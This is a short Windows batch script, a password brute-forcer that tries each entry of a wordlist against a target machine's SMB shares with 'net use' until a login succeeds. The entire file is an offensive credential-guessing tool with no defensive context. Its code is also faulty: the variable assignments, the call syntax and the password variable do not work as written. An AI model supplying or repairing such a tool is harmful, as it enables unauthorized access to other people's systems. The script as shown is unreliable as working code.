@echo off
set /p ip = "Enter IP adress: "
set /p user = "Enter username: "
set /p wordlist = "Enter password list: "

for /f %%a in (%wordlist%) do (

	echo %%a 
	call: attemp
	
)
echo Password not Found :(
pause
exit

:success
echo Password Found: %pass% > nul 2>&1
net use \\%ip% /d /y
pause
exit

:attemp
net use \\%ip% /user:%user% %pass% > nul 2>&1
echo attemp: %pass%
if %errorlevel% EQU 0 goto success